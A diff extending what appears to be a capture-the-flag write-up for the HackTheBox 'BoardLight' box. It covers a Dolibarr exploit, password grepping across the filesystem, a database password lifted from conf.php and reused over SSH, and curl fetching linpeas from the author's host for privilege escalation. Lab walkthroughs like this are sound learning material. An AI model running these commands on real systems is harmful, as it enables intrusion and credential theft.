@@ -52,5 +52,83 @@ There are a lot of other directories and most I don't have access to.
 
 I just tried admin:admin and it let me in...
 
+There is an exploit script on [this GitHub repo](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py) gonna try that to see if I can get it. Trying to create a page manually on my end seems to have failed. Not sure if its the user or not.
 
+The script worked. So I must have missed something the other way.
+
+# Foothold
+
+Now that I have a foothold I can get the user flag.
+
+`find -name '*user.txt' 2>/dev/null`
+
+hmm that didnt work
+
+For pretty shell:
+```
+script /dev/null -qc /bin/bash
+stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+```
+
+`sudo -l` is a miss too.
+
+How many user are on the box ? (`cat /etc/passwd | grep /bin/bash`)
+
+I can't help but notice it says www-data@boardlight as my user. Does that mean I am still in www-data, which is why I can't see the user flag?
+
+Looks like I have access to Python3... Which might be helpful later.
+
+In /etc/security there is a fill call access.conf, but it doesn't contain anything but comments.
+
+There is a Home dir, with a user called larissa, but I don't have access. Seems I need to get her password and ssh in probably.
+
+Lets look for some .dat files maybe:
+`find / -name '*.dat' 2>/dev/null`
+
+Theres a passwords.dat file but I don't have access.
+
+I can try this to see if I can grep for it.
+`find / -name '*.dat' 2>/dev/null | xargs grep -i 'Password'`
+
+Lets looks for passwords:
+`grep -ri "password" / 2>/dev/null`
+
+Okay so I ended needing some help here so I went to the discussion for this box.
+
+The comments mentioned finding a config file but no matter how I grepped I couldn't find anything. So I looked up config files for Dolibar and found I need to find this file conf.php.
+
+Once I did here `/html/crm.board.htb/htdocs/conf`.
+
+I cat the file and see `$dolibarr_main_db_pass='serverfun2$2023!!';`
+
+Then I tried to ssh into the server with `ssh larissa@crm.board.htb` and that password and it worked.
+
+That allowed me to get the user file.
+
+Now for Priv Esc.
+
+# Priv Esc
+
+I have access to curl so I get the linpeas.sh file. 
+
+Start a python server inside my linpeas directory:
+```
+cd /Users/noneya/Useful/Tools/linpeas
+python3 -m http.server 8001
+```
+
+Then I get the file
+
+```
+cd /tmp
+curl http://10.10.14.69:8001/linpeas.sh > /tmp/linpeas.sh
+```
+
+Then get the output:
+`bash linpeas.sh > /home/larissa/results.txt`
+
+There an interesting host in the output...
+```
+127.0.1.1	boardlight
+```
 
